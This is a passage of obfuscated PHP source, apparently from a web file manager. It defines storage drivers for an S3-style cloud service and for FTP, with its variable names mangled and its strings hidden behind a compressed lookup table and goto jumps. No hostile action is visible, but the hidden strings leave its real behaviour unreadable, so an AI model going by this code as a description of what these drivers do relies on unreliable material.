$¸İü¥¾½ = strtotime(date($§Ü¯¸Ø†[1749])); $•ş—É‡… = substr(md5($this->token . $§Ü¯¸Ø†[286] . $¸İü¥¾½ . $§Ü¯¸Ø†[1750] . $°ŸŸ¬º), 12, 8) . $¸İü¥¾½; $ş³²£—æ[] = $§Ü¯¸Ø†[1751] . $•ş—É‡…; } $¤ÜåßßŸ = !empty($ş³²£—æ) ? $§Ü¯¸Ø†[76] . implode($§Ü¯¸Ø†[286], $ş³²£—æ) : $§Ü¯¸Ø†[12]; return $this->getHost() . $§Ü¯¸Ø†[8] . $this->pathEncode($°ŸŸ¬º) . $¤ÜåßßŸ; } public function fileOut($é´åµú“, $œ¨Øò = false, $ô¹Û ˆó = false, $ËÅ“Ñä = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($é´åµú“, $œ¨Øò, $ô¹Û ˆó, $ËÅ“Ñä); } if (!$ô¹Û ˆó) { $ô¹Û ˆó = $this->pathThis($é´åµú“); } $ÆÈ¾÷‹­ = $œ¨Øò ? array($_SERVER[±Ö‰ô½¯][1752] . rawurlencode($ô¹Û ˆó)) : array(); $—³ŞÃÇÕ = $this->link($é´åµú“, $ÆÈ¾÷‹­); $this->fileOutLink($—³ŞÃÇÕ); } public function fileOutServer($ËªÇÕ…æ, $ĞŠõ‘ó‡ = false, $í¸òìúÇ = false, $Û‚ÎíÌÖ = '') { parent::fileOut($ËªÇÕ…æ, $ĞŠõ‘ó‡, $í¸òìúÇ, $Û‚ÎíÌÖ); } public function fileOutImage($î…ãµÁ, $÷ê¥‰ä = 250) { $¯Ø…ø‰â = $this->link($î…ãµÁ . $_SERVER[±Ö‰ô½¯][1753] . $÷ê¥‰ä); $this->fileOutLink($¯Ø…ø‰â); } public function fileOutImageServer($Áªá¯‹Ä, $®¥§‰œ¦ = 250) { parent::fileOutImage($Áªá¯‹Ä, $®¥§‰œ¦); } public function hashMd5($ûÓÎïÁ†) { $íõ¡¹´® =& $_SERVER[±Ö‰ô½¯]; $Š²ÓşÊ = $this->_objectMeta($ûÓÎïÁ†); return isset($Š²ÓşÊ[$íõ¡¹´®[247]]) ? $Š²ÓşÊ[$íõ¡¹´®[247]] : !1; } public function size($ºá×÷±Å) { $Àü¸’öç = $this->objectMeta($ºá×÷±Å); return $Àü¸’öç ? $Àü¸’öç[$_SERVER[±Ö‰ô½¯][79]] : 0; } public function info($€Š§şğå) { if ($this->isFolder($€Š§şğå)) { return $this->folderInfo($€Š§şğå); } else { if ($this->isFile($€Š§şğå)) { return $this->fileInfo($€Š§şğå); } } return !1; } public function exist($şŒöªÒ) { return $this->isFile($şŒöªÒ) || $this->isFolder($şŒöªÒ); } public function isFile($­ğĞ¥µ) { return !$this->isFolder($­ğĞ¥µ) && $this->objectMeta($­ğĞ¥µ); } public function isFolder($şõÙ²¬¬) { return $this->cacheMethod($_SERVER[±Ö‰ô½¯][179], $şõÙ²¬¬); } protected function objectMeta($öÛ¢¼‚Ô) { return $this->cacheMethod($_SERVER[±Ö‰ô½¯][181], $öÛ¢¼‚Ô); } protected function _objectMeta($ìİ¼¬ÙÊ) { $ÄŒï¸›î =& $_SERVER[±Ö‰ô½¯]; if ($ìİ¼¬ÙÊ == $ÄŒï¸›î[12] || $ìİ¼¬ÙÊ == $ÄŒï¸›î[8]) { return array(); } $Ö¥€Á¨ó = $this->ussRequest($ìİ¼¬ÙÊ, $ÄŒï¸›î[1754]); if (!$Ö¥€Á¨ó[$ÄŒï¸›î[1349]]) { return null; } $ªĞ¸ûÌ‡ = isset($Ö¥€Á¨ó[$ÄŒï¸›î[1339]]) ? $Ö¥€Á¨ó[$ÄŒï¸›î[1339]] : array(); if (!isset($ªĞ¸ûÌ‡[$ÄŒï¸›î[1755]])) { return null; } $ßå„‡¤ = array($ÄŒï¸›î[33] => isset($ªĞ¸ûÌ‡[$ÄŒï¸›î[1755]]) ? $ªĞ¸ûÌ‡[$ÄŒï¸›î[1755]] : null, $ÄŒï¸›î[79] => isset($ªĞ¸ûÌ‡[$ÄŒï¸›î[1756]]) ? $ªĞ¸ûÌ‡[$ÄŒï¸›î[1756]] : null, $ÄŒï¸›î[247] => isset($ªĞ¸ûÌ‡[$ÄŒï¸›î[1757]]) ? $ªĞ¸ûÌ‡[$ÄŒï¸›î[1757]] : null, $ÄŒï¸›î[1724] => isset($ªĞ¸ûÌ‡[$ÄŒï¸›î[1758]]) ? $ªĞ¸ûÌ‡[$ÄŒï¸›î[1758]] : null); $ßå„‡¤[$ÄŒï¸›î[1725]] = isset($ªĞ¸ûÌ‡[$ÄŒï¸›î[1759]]) ? strtotime($ªĞ¸ûÌ‡[$ÄŒï¸›î[1759]]) : $ßå„‡¤[$ÄŒï¸›î[1724]]; return $ßå„‡¤; } protected function _isFolder($‰‹¡Ş×) { $¢»öú¦ú =& $_SERVER[±Ö‰ô½¯]; if ($‰‹¡Ş× == $¢»öú¦ú[12] || $‰‹¡Ş× == $¢»öú¦ú[8]) { return !0; } $ÏÔó¸ô = $this->_objectMeta($‰‹¡Ş×); return isset($ÏÔó¸ô[$¢»öú¦ú[33]]) && $ÏÔó¸ô[$¢»öú¦ú[33]] == $¢»öú¦ú[78] ? !0 : !1; } } goto c®Ñë’‘±; CÑ… „š: if (!$rwyscnbfmk) { return; } $_SERVER[îâŸó­ˆ] = explode($_SERVER[±Ö‰ô½¯][700], gzinflate(substr($_SERVER[±Ö‰ô½¯][701], 10, -8))); $xkelmhbwan = $_SERVER[±Ö‰ô½¯][702]; goto eçŠñìƒŞ¯; a¶¹¿„øÍë: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($ÍÅş†²) { parent::__construct($ÍÅş†²); $this->setSignVersion($_SERVER[±Ö‰ô½¯][249]); } public function uploadFormData($Ëñ¢éÕü, $ÖÑË—âÓ = 3600) { $İ²ü‘ =& $_SERVER[±Ö‰ô½¯]; $§ÃŒáª› = $İ²ü‘[231]; $•ñŸ¹’Ô = $İ²ü‘[259]; $½²»À´ò = $İ²ü‘[62]; $‹ë±ÊÓ = gmdate($İ²ü‘[260]); $¶âîıİ‹ = gmdate($İ²ü‘[261]); $ÅÌºò¨ = $İ²ü‘[262]; $®ÑÉ¦÷ = $ÖÑË—âÓ . $İ²ü‘[12]; $ÓœÓ¼ = $İ²ü‘[263]; $ßí¬‰·´ = array($this->accessKey, $¶âîıİ‹, $this->region, $½²»À´ò, $ÅÌºò¨); $Ş»ıòÅÌ = implode($İ²ü‘[8], $ßí¬‰·´); $êÌ•‹Ñ = array($İ²ü‘[264] => gmdate($İ²ü‘[1474], strtotime($İ²ü‘[266])), $İ²ü‘[267] => array(array($İ²ü‘[268] => $this->bucket), array($İ²ü‘[308] => $§ÃŒáª›), array($İ²ü‘[269], $İ²ü‘[270], $İ²ü‘[12]), array($İ²ü‘[269], $İ²ü‘[271], $İ²ü‘[12]), array($İ²ü‘[269], $İ²ü‘[309], $İ²ü‘[12]), array($İ²ü‘[272] => $ÓœÓ¼), array($İ²ü‘[273] => $Ş»ıòÅÌ), array($İ²ü‘[274] => $•ñŸ¹’Ô), array($İ²ü‘[275] => $‹ë±ÊÓ), array($İ²ü‘[276] => $®ÑÉ¦÷))); $—“è©¬š = base64_encode(json_encode($êÌ•‹Ñ)); $Ë°¶˜²› = hash_hmac($İ²ü‘[277], $¶âîıİ‹, $İ²ü‘[278] . $this->secret, !0); $µ•¯õ™ = hash_hmac($İ²ü‘[277], $this->region, $Ë°¶˜²›, !0); $ª‹³‹ñû = hash_hmac($İ²ü‘[277], $½²»À´ò, $µ•¯õ™, !0); $£¬ÚÈ = hash_hmac($İ²ü‘[277], $ÅÌºò¨, $ª‹³‹ñû, !0); $Ÿ„¤ Ã• = hash_hmac($İ²ü‘[277], $—“è©¬š, $£¬ÚÈ); $·Ü“ëö¨ = array($İ²ü‘[248] => $İ²ü‘[12], $İ²ü‘[296] => $İ²ü‘[12], $İ²ü‘[308] => $§ÃŒáª›, $İ²ü‘[272] => $ÓœÓ¼, $İ²ü‘[279] => $—“è©¬š, $İ²ü‘[310] => $Ş»ıòÅÌ, $İ²ü‘[311] => $•ñŸ¹’Ô, $İ²ü‘[312] => $‹ë±ÊÓ, $İ²ü‘[313] => $®ÑÉ¦÷, $İ²ü‘[314] => $Ÿ„¤ Ã•, $İ²ü‘[208] => $this->getHost()); return $·Ü“ëö¨; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($ıÏ‰½éë) { parent::__construct(); if (count($ıÏ‰½éë) > 0) { $this->_init($ıÏ‰½éë); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($óÓ¯†·±) { $æ©àôû¥ =& $_SERVER[±Ö‰ô½¯]; global $config; $this->appCharset = $config[$æ©àôû¥[1595]]; $this->systemCharset = $config[$æ©àôû¥[1596]]; if (isset($óÓ¯†·±[$æ©àôû¥[1597]]) && $óÓ¯†·±[$æ©àôû¥[1597]]) { $this->systemCharset = $óÓ¯†·±[$æ©àôû¥[1597]]; } } public function iconvApp($¹€êøÀ¸) { return $this->iconvTo($¹€êøÀ¸, $this->systemCharset, $this->appCharset); } public function iconvSystem($öÃ¬‰§Ø) { return $this->iconvTo($öÃ¬‰§Ø, $this->appCharset, $this->systemCharset); } public function getPathOuter($Åãœ›–Ì) { $Àš¨×ó =& $_SERVER[±Ö‰ô½¯]; $ùš“æÂš = $this->iconvApp($this->pathBase); $Åãœ›–Ì = $this->iconvApp($Åãœ›–Ì); if (substr($ùš“æÂš, 0, 2) == $Àš¨×ó[1472]) { $ùš“æÂš = BASIC_PATH . substr($ùš“æÂš, 2); } if (substr($Åãœ›–Ì, 0, 2) == $Àš¨×ó[1472]) { $Åãœ›–Ì = BASIC_PATH . substr($Åãœ›–Ì, 2); } $ùš“æÂš = KodIO::clear($ùš“æÂš); $Åãœ›–Ì = KodIO::clear($Åãœ›–Ì); $Åãœ›–Ì = substr($Åãœ›–Ì, strlen($ùš“æÂš)); if (empty($this->pathDriver)) { return $Åãœ›–Ì; } return $this->pathDriver . $Àš¨×ó[8] . ltrim($Åãœ›–Ì, $Àš¨×ó[8]); } private function _init($ñ™Â“ğ• = array()) { $³ ›÷…Ï =& $_SERVER[±Ö‰ô½¯]; if (!function_exists($³ ›÷…Ï[1598])) { throw new Exception(LNG($³ ›÷…Ï[1599])); } $this->config = $ñ™Â“ğ•; $this->charsetReset($ñ™Â“ğ•); foreach ($ñ™Â“ğ• as $ìÂñÌ¬ => $Öº·…İ) { if (isset($this->{$ìÂñÌ¬})) { $this->{$ìÂñÌ¬} = $Öº·…İ; } } return $this->_login($ñ™Â“ğ•); } private function _login($˜è‡ˆ‹) { $ø¸’ó¶ =& $_SERVER[±Ö‰ô½¯]; static $õŸÊ˜óë = array(); $çàêÍ­Ï = md5(json_encode($˜è‡ˆ‹)); if (isset($õŸÊ˜óë[$çàêÍ­Ï])) { foreach ($õŸÊ˜óë[$çàêÍ­Ï] as $à™Ã¸‚× => $˜í¿À­×) { $this->{$à™Ã¸‚×} = $˜í¿À­×; } return !0; } $™ıÎà–ö = parse_url(trim($this->server, $ø¸’ó¶[8])); $this->host = $™ıÎà–ö[$ø¸’ó¶[208]]; $™šš¯´ = isset($™ıÎà–ö[$ø¸’ó¶[207]]) && $™ıÎà–ö[$ø¸’ó¶[207]] == $ø¸’ó¶[1600] ? !0 : !1; $this->scheme = $™šš¯´ ? $ø¸’ó¶[1601] : $ø¸’ó¶[1602]; $this->port = isset($™ıÎà–ö[$ø¸’ó¶[209]]) ? $™ıÎà–ö[$ø¸’ó¶[209]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($ø¸’ó¶[1603]) . $this->host . $ø¸’ó¶[4] . $this->port, !0); return !1; } $¬ÃÇ¦ó£ = @ftp_login($this->connect, $this->username, $this->userpass); if (!$¬ÃÇ¦ó£) { $this->writeLog(LNG($ø¸’ó¶[1604]) . $this->username, !0); return !1; } $this->ftpPath = @ftp_pwd($this->connect); @ftp_chdir($this->connect, $ø¸’ó¶[8]); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $˜¬ü‚Ş = $this->pasv == $ø¸’ó¶[91] ? !0 : !1; @ftp_pasv($this->connect, $˜¬ü‚Ş); $õŸÊ˜óë[$çàêÍ­Ï] = array($ø¸’ó¶[1605] => $this->connect, $ø¸’ó¶[208] => $this->host, $ø¸’ó¶[207] => $this->scheme, $ø¸’ó¶[209] => $this->port); return $¬ÃÇ¦ó£; } private function _isconn($Ä ­¾ß = true) { if (is_resource($this->connect)) { return !0; } if (!$Ä ­¾ß) { return !1; } return $this->_login($this->config); } public function mkfile($î¼èÛÅ€, $êØ¼Ã” = '', $ßÂ¯© = REPEAT_RENAME) { if ($this->setContent($î¼èÛÅ€, $êØ¼Ã”)) { return $this->getPathOuter($î¼èÛÅ€); } $this->writeLog(LNG($_SERVER[±Ö‰ô½¯][1606]), !0); return !1; } public function mkdir($ÛÙ¨ôÂƒ, $¯ğ–õ¬à = REPEAT_SKIP) { $ûŠÅ¼ŞŸ =& $_SERVER[±Ö‰ô½¯]; if (!$ÛÙ¨ôÂƒ || $ÛÙ¨ôÂƒ == $ûŠÅ¼ŞŸ[8]) { return !0; } if (!$this->_isconn()) { return !1; } $ÛÙ¨ôÂƒ = $this->iconvSystem($ÛÙ¨ôÂƒ); if ($this->_isFolder($ÛÙ¨ôÂƒ) || @ftp_mkdir($this->connect, $ÛÙ¨ôÂƒ)) { return $this->getPathOuter($ÛÙ¨ôÂƒ); } if (!$this->mkdir($this->pathFather($ÛÙ¨ôÂƒ))) { return !1; } if ($ÛÙ¨ôÂƒ = @ftp_mkdir($this->connect, $ÛÙ¨ôÂƒ)) { return $this->getPathOuter($ÛÙ¨ôÂƒ); } $®ªìã¼ = __FUNCTION__ . $ûŠÅ¼ŞŸ[1607]; $this->writeLog($®ªìã¼, !0); return !1; } public function copyFile($”™ûŞñ, $Ä––·Áó) { if (!$this->_isconn()) { return !1; } $Š©¾‡àä = $this->pathThis($this->iconvSystem($”™ûŞñ)); $÷ó¤åº = $this->tempFile($Š©¾‡àä); $ÅÀØ»ü = $this->iconvApp($÷ó¤åº); $this->download($”™ûŞñ, $ÅÀØ»ü); $ô¢åÛå¬ = $this->upload($Ä––·Áó, $ÅÀØ»ü); $this->tempFileRemve($÷ó¤åº); return $ô¢åÛå¬; } public function moveFile($Ä‡àæš, $„«ÉíÈ ) { if (!$this->_isconn()) { return !1; } $Ä‡àæš = $this->iconvSystem($Ä‡àæš); $„«ÉíÈ  = $this->iconvSystem($„«ÉíÈ ); $„•˜Á  = @ftp_rename($this->connect, $Ä‡àæš, $„«ÉíÈ ); if (!$„•˜Á ) { $this->writeLog(__FUNCTION__ . $_SERVER[±Ö‰ô½¯][1607], !0); return !1; } return $this->getPathOuter($„«ÉíÈ ); } public function delFile($ÖÑÁÔ°) { if (!$this->_isconn()) { return !1; } $ÖÑÁÔ° = $this->iconvSystem($ÖÑÁÔ°); $Ã†¸¼©Ÿ = @ftp_delete($this->connect, $ÖÑÁÔ°); if (!$Ã†¸¼©Ÿ) { $this->writeLog(__FUNCTION__ . $_SERVER[±Ö‰ô½¯][1607], !0); } return $Ã†¸¼©Ÿ; } public function delFolder($‚Î¨ªó¡) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $–×Âİ‘ = $ŠõÛø£ó = array(); $this->fileList($‚Î¨ªó¡, $–×Âİ‘, $ŠõÛø£ó, !0); $this->listItemCache = !0; foreach ($ŠõÛø£ó as $®Â¥½¨Â) { $š½½ˆ‚ò = $this->iconvSystem($®Â¥½¨Â[$_SERVER[±Ö‰ô½¯][32]]); $‹çãè±ï = @ftp_delete($this->connect, $š½½ˆ‚ò); if (!$‹çãè±ï) { return !1; } } foreach ($–×Âİ‘ as $š½½ˆ‚ò) { $š½½ˆ‚ò = $this->iconvSystem($š½½ˆ‚ò); $‹çãè±ï = @ftp_rmdir($this->connect, $š½½ˆ‚ò); if (!$‹çãè±ï) { return !1; } } $‚Î¨ªó¡ = $this->iconvSystem($‚Î¨ªó¡); return @ftp_rmdir($this->connect, $‚Î¨ªó¡); } public function rename($ëÔ¬¢¹Ü, $ûŸ‡—Š ) { $ÅâÈ”ÂÀ =& $_SERVER[±Ö‰ô½¯]; if (!$this->_isconn()) { return !1; } $¥³Â‹åö = $this->fileNameAuto($this->pathFather($ëÔ¬¢¹Ü), $ûŸ‡—Š ); $¥³Â‹åö = $this->iconvSystem($¥³Â‹åö); $ëÔ¬¢¹Ü = $this->iconvSystem($ëÔ¬¢¹Ü); $¡»Ì¯‘› = $this->pathFather($ëÔ¬¢¹Ü); $øÀñ“ ¦ = rtrim($¡»Ì¯‘›, $ÅâÈ”ÂÀ[8]) . $ÅâÈ”ÂÀ[8] . $¥³Â‹åö; $«ÌéºœÙ = @ftp_rename($this->connect, $ëÔ¬¢¹Ü, $øÀñ“ ¦); if (!$«ÌéºœÙ) { $this->writeLog(__FUNCTION__ . $ÅâÈ”ÂÀ[1607], !0); return !1; } $øÀñ“ ¦ = $this->iconvApp($øÀñ“ ¦); return $this->getPathOuter($øÀñ“ ¦); } private function folderInfo($”·µÕĞì, $ÄîøØÆ§ = false) { $æß›Ó¸ò =& $_SERVER[±Ö‰ô½¯]; $ŠÅ—ÅÃı = array($æß›Ó¸ò[32] => $this->pathThis($”·µÕĞì), $æß›Ó¸ò[87] => $this->getPathOuter($æß›Ó¸ò[8] . $”·µÕĞì), $æß›Ó¸ò[33] => $æß›Ó¸ò[78]); if ($ÄîøØÆ§) { return $ŠÅ—ÅÃı; } $ŠÅ—ÅÃı[$æß›Ó¸ò[233]] = $ŠÅ—ÅÃı[$æß›Ó¸ò[88]] = 0; $ŠÅ—ÅÃı[$æß›Ó¸ò[234]] = $ŠÅ—ÅÃı[$æß›Ó¸ò[235]] = !0; return $ŠÅ—ÅÃı; } private function fileInfo($úå‚²Ñ¶, $àƒ£À€ = false, $¢õ‡¢‰• = array()) { $ƒä€“œç =& $_SERVER[±Ö‰ô½¯]; $èñâœ©´ = array($ƒä€“œç[32] => $this->pathThis($úå‚²Ñ¶), $ƒä€“œç[87] => $this->getPathOuter($ƒä€“œç[8] . $úå‚²Ñ¶), $ƒä€“œç[33] => $ƒä€“œç[232], $ƒä€“œç[79] => isset($¢õ‡¢‰•[$ƒä€“œç[79]]) ? $¢õ‡¢‰•[$ƒä€“œç[79]] : 0, $ƒä€“œç[168] => $this->ext($úå‚²Ñ¶)); if ($àƒ£À€) { return $èñâœ©´; } $èñâœ©´[$ƒä€“œç[233]] = $èñâœ©´[$ƒä€“œç[88]] = 0; $èñâœ©´[$ƒä€“œç[234]] = $èñâœ©´[$ƒä€“œç[235]] = !0; $µ‘ğ…óô = $this->iconvSystem($úå‚²Ñ¶); $èñâœ©´[$ƒä€“œç[88]] = @ftp_mdtm($this->connect, $µ‘ğ…óô); if (empty($¢õ‡¢‰•)) { $¢õ‡¢‰• = $this->objectMeta($úå‚²Ñ¶); if (!$¢õ‡¢‰•) { return $èñâœ©´; } } $èñâœ©´[$ƒä€“œç[79]] = $¢õ‡¢‰•[$ƒä€“œç[79]]; return $èñâœ©´; } public function size($©áÙ¢†È) { $¾ç¶’¿ = $this->objectMeta($©áÙ¢†È); return $¾ç¶’¿ ? $¾ç¶’¿[$_SERVER[±Ö‰ô½¯][79]] : 0; } public function info($¤€·£¦û) { if ($this->isFile($¤€·£¦û)) { return $this->fileInfo($¤€·£¦û, 0); } else { if ($this->isFolder($¤€·£¦û)) { return $this->folderInfo($¤€·£¦û); } } return !1; } private function fileList($‚ü­èÆ¿, &$ÔÌ†Ëü, &$Ââ–ŞèÄ, $Æòä…ñ = false) { $­ñèÌÆ =& $_SERVER[±Ö‰ô½¯]; $‚ü­èÆ¿ = $this->iconvSystem($‚ü­èÆ¿); if (!$this->isFolder($‚ü­èÆ¿)) { return !1; } $‚ü­èÆ¿ = rtrim($‚ü­èÆ¿, $­ñèÌÆ[8]) . $­ñèÌÆ[8]; check_abort(); $Ä½«†£õ = @ftp_rawlist($this->connect, $‚ü­èÆ¿); if (!$Ä½«†£õ) { $Ä½«†£õ = array(); } $ˆ›€¬Ÿº = array($­ñèÌÆ[10] => 1, $­ñèÌÆ[1417] => 1); foreach ($Ä½«†£õ as $¦ÆÔ¦…é) { $¨®úæ¨¾ = $this->_listItem($¦ÆÔ¦…é); if ($¨®úæ¨¾[0] == $­ñèÌÆ[856]) { continue; } $§¤—¼„ß = $¨®úæ¨¾[8]; if (empty($§¤—¼„ß) && $§¤—¼„ß !== $­ñèÌÆ[230] || isset($ˆ›€¬Ÿº[$§¤—¼„ß])) { continue; } $§¤—¼„ß = $this->iconvApp($‚ü­èÆ¿ . ltrim($§¤—¼„ß, $­ñèÌÆ[8])); $°ùöøˆ = array($­ñèÌÆ[32] => $§¤—¼„ß, $­ñèÌÆ[33] => $­ñèÌÆ[232], $­ñèÌÆ[79] => $¨®úæ¨¾[4]); if (substr($¦ÆÔ¦…é, 0, 1) == $­ñèÌÆ[1608]) { $°ùöøˆ[$­ñèÌÆ[33]] = $­ñèÌÆ[78]; $°ùöøˆ[$­ñèÌÆ[79]] = 0; } $‡‚¥ÆÅé = $°ùöøˆ[$­ñèÌÆ[33]] == $­ñèÌÆ[78] ? !0 : !1; $this->cacheMethodInfoSet($§¤—¼„ß, $‡‚¥ÆÅé, $°ùöøˆ); if ($‡‚¥ÆÅé) { $ÔÌ†Ëü[] = $§¤—¼„ß; if ($Æòä…ñ) { $this->fileList($§¤—¼„ß, $ÔÌ†Ëü, $Ââ–ŞèÄ, $Æòä…ñ); } continue; } $Ââ–ŞèÄ[] = $°ùöøˆ; } $this->cacheMethodInfoSet($‚ü­èÆ¿, !0); } private function _listItem($ˆ…ˆó—») { if (empty($ˆ…ˆó—»)) { return array(); } $åäı”Ù = preg_split($_SERVER[±Ö‰ô½¯][1609], $ˆ…ˆó—»); if (count($åäı”Ù) <= 9) { return $åäı”Ù; } $åäı”Ù[8] = trim(substr($ˆ…ˆó—», strpos($ˆ…ˆó—», $åäı”Ù[7]) + strlen($åäı”Ù[7]))); return array_splice($åäı”Ù, 0, 9); } public function listPath($æÏñ¼ª­, $£ˆ¥Òƒ = false) { $òí¢ÆÃ“ =& $_SERVER[±Ö‰ô½¯]; if (!$this->_isconn()) { return !1; } $Àğ÷ñÖõ = $ØÀ§×çë = array(); $this->fileList($æÏñ¼ª­, $Àğ÷ñÖõ, $ØÀ§×çë); foreach ($Àğ÷ñÖõ as $ÑêÍÁÍš => $™Ííæ¨³) { $Àğ÷ñÖõ[$ÑêÍÁÍš] = $this->folderInfo($™Ííæ¨³, $£ˆ¥Òƒ); } foreach ($ØÀ§×çë as $ÑêÍÁÍš => $™Ííæ¨³) { $ØÀ§×çë[$ÑêÍÁÍš] = $this->fileInfo($™Ííæ¨³[$òí¢ÆÃ“[32]], $£ˆ¥Òƒ, $™Ííæ¨³); } return array($òí¢ÆÃ“[85] => $Àğ÷ñÖõ, $òí¢ÆÃ“[86] => $ØÀ§×çë); } public function has($±ìöŸ‹–, $ÇÃÌ„µÏ = false, $ı«ó”¼ = true) { $î°Ê¨Í³ =& $_SERVER[±Ö‰ô½¯]; $‡‚ğ¦Ó = $ºĞ¨µÛö = array(); $˜–ç€ÁÑ = $ÇÃÌ„µÏ ? !0 : !1; $this->fileList($±ìöŸ‹–, $‡‚ğ¦Ó, $ºĞ¨µÛö, $˜–ç€ÁÑ); if ($ÇÃÌ„µÏ) { return array($î°Ê¨Í³[241] => count($ºĞ¨µÛö), $î°Ê¨Í³[242] => count($‡‚ğ¦Ó)); } if ($ı«ó”¼) { if (count($ºĞ¨µÛö)) { return !0; } } else { if (count($‡‚ğ¦Ó)) { return !0; } } return !1; } public function listAll($îÛ…ÕÈ–) { $º„·ü±ª =& $_SERVER[±Ö‰ô½¯]; if (!$this->_isconn()) { return !1; } $†ÉšäÇ = $îËÉÂáò = array(); $this->fileList($îÛ…ÕÈ–, $†ÉšäÇ, $îËÉÂáò, !0); $×ùˆ¦­Œ = array_to_keyvalue($îËÉÂáò, $º„·ü±ª[32]); foreach ($†ÉšäÇ as $ğ˜ÏëÖæ) { if (is_string($ğ˜ÏëÖæ)) { $×ùˆ¦­Œ[$ğ˜ÏëÖæ] = array($º„·ü±ª[79] => 0); } } return $this->listAllFiles($îÛ…ÕÈ–, $×ùˆ¦­Œ); } public function getContent($Ï¨¼‰±ê) { if (!$this->_isconn()) { return !1; } $Ï¨¼‰±ê = $this->iconvSystem($Ï¨¼‰±ê); return $this->fileSubstr($Ï¨¼‰±ê); } public function setContent($òÇæşïô, $™˜ô†Í“ = '') { if (!$this->_isconn()) { return !1; } $áŞâ€¬¶ = $this->pathThis($this->iconvSystem($òÇæşïô)); $“¬•ù¥ç = $this->tempFile($áŞâ€¬¶); file_put_contents($“¬•ù¥ç, $™˜ô†Í“); $íÙŞÀ€î = $this->upload($òÇæşïô, $this->iconvApp($“¬•ù¥ç)); $this->tempFileRemve($“¬•ù¥ç); return $íÙŞÀ€î; } public function fileSubstr($„ĞÔ‚‹, $ÀÒ³¸¡º = 0, $â¤øœß = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($„ĞÔ‚‹, $ÀÒ³¸¡º, $â¤øœß); } private function ftpRequest($²¦ßĞ¡œ, $óªŞÇ× = 0, $¶Ë°–¨ü = false) { $à±÷õŞ÷ =& $_SERVER[±Ö‰ô½¯]; $²¦ßĞ¡œ = $à±÷õŞ÷[8] . ltrim(str_ltrim($²¦ßĞ¡œ, $this->ftpPath), $à±÷õŞ÷[8]); $²¦ßĞ¡œ = $this->iconvSystem($²¦ßĞ¡œ); $‘Şş®ø® = $this->scheme . $this->host . $à±÷õŞ÷[4] . $this->port; $ª¸ ¥É¿ = curl_init(); curl_setopt($ª¸ ¥É¿, CURLOPT_URL, $‘Şş®ø® . $this->pathEncode($²¦ßĞ¡œ)); curl_setopt($ª¸ ¥É¿, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($¶Ë°–¨ü) { $¶¢èŞÚ² = $óªŞÇ× + $¶Ë°–¨ü - 1; curl_setopt($ª¸ ¥É¿, CURLOPT_RANGE, "{$óªŞÇ×}\55{$¶¢èŞÚ²}"); } curl_setopt($ª¸ ¥É¿, CURLOPT_RETURNTRANSFER, 1); $™­µÒÏÌ = curl_exec($ª¸ ¥É¿); curl_close($ª¸ ¥É¿); return $™­µÒÏÌ; } public function upload($†‰Å‘Ä¯, $ÅÒ¸Ì¿×, $â¯ÂËíà = false, $Ã¦¹”ğ = REPEAT_REPLACE) { if (!$ÅÒ¸Ì¿× || !@file_exists($ÅÒ¸Ì¿×)) { return !1; } if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($†‰Å‘Ä¯))) { return !1; } $†‰Å‘Ä¯ = $this->iconvSystem($†‰Å‘Ä¯); $ÅÒ¸Ì¿× = $this->iconvSystem($ÅÒ¸Ì¿×); $ÃØñ®ÁÔ = ftp_nb_put($this->connect, $†‰Å‘Ä¯, $ÅÒ¸Ì¿×, FTP_BINARY); while ($ÃØñ®ÁÔ == FTP_MOREDATA) { $ÃØñ®ÁÔ = ftp_nb_continue($this->connect); } if ($ÃØñ®ÁÔ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[±Ö‰ô½¯][1607], !0); return !1; } return $this->getPathOuter($†‰Å‘Ä¯); } public function download($ÙïîƒÛš, $Ü‡Ø¹à­ = '') { if (!$this->_isconn()) { return !1; } $Ü÷±›ÜŠ = $this->pathFather($Ü‡Ø¹à­); if (!IO::mkdir($Ü÷±›ÜŠ)) { return !1; } $ÙïîƒÛš = $this->iconvSystem($ÙïîƒÛš); $Ü‡Ø¹à­ = $this->iconvSystem($Ü‡Ø¹à­); $¢ìÔæ‘ = ftp_nb_get($this->connect, $Ü‡Ø¹à­, $ÙïîƒÛš, FTP_BINARY); while ($¢ìÔæ‘ == FTP_MOREDATA) { $¢ìÔæ‘ = ftp_nb_continue($this->connect); } if ($¢ìÔæ‘ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[±Ö‰ô½¯][1607], !0); return !1; } return $this->iconvApp($Ü‡Ø¹à­); } public function exist($¤Å•’Â) { return $this->isFile($¤Å•’Â) || $this->isFolder($¤Å•’Â); } public function isFile($öÉçŞÆ‹) { return !$this->isFolder($öÉçŞÆ‹) && $this->objectMeta($öÉçŞÆ‹); } public function isFolder($Š˜Ñå«¢) { return $this->cacheMethod($_SERVER[±Ö‰ô½¯][179], $Š˜Ñå«¢); } protected function objectMeta($êóÖÂÄÆ) { return $this->cacheMethod($_SERVER[±Ö‰ô½¯][181], $êóÖÂÄÆ); } protected function _objectMeta($‚©ãì€‚) { $æÌğîê =& $_SERVER[±Ö‰ô½¯]; if ($‚©ãì€‚ == $æÌğîê[12] || $‚©ãì€‚ == $æÌğîê[8]) { return array(); } if (!$this->_isconn()) { return !1; } $‚©ãì€‚ = $this->iconvSystem($‚©ãì€‚); $Êé‹ØÙÙ = array($æÌğîê[32] => $this->iconvApp($‚©ãì€‚), $æÌğîê[33] => $æÌğîê[232], $æÌğîê[79] => 0); $´Ôëæ÷‹ = @ftp_size($this->connect, $‚©ãì€‚); if ($´Ôëæ÷‹ != -1) { $Êé‹ØÙÙ[$æÌğîê[79]] = $´Ôëæ÷‹; } else { $ûŸ˜õÀ = @ftp_chdir($this->connect, $‚©ãì€‚); if (!$ûŸ˜õÀ) { return !1; } @ftp_chdir($this->connect, $æÌğîê[8]); 